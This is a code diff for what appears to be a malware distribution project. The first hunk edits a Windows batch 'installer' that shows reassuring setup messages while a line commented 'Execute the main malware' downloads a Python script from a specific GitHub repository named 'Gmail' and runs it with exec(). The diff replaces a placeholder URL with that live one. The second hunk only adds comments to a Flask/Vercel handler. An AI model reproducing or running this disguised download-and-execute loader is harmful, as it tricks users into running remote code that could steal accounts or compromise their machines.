@@ -21,7 +21,7 @@ echo Please wait while we configure your system...
 timeout /t 3 /nobreak >nul
 
 REM Execute the main malware
-python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/USERNAME/REPO/main/app.py').read())"
+python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/Wwb-Daniel/Gmail/main/app.py').read())"
 
 echo Installation completed successfully!
 pause
@@ -220,9 +220,11 @@ def not_found(error):
     </html>
     """, 404
 
+# Vercel serverless handler
 def handler(request):
     """Vercel serverless handler"""
     return app(request.environ, lambda *args: None)
 
+# For local testing
 if __name__ == '__main__':
     app.run(debug=True)
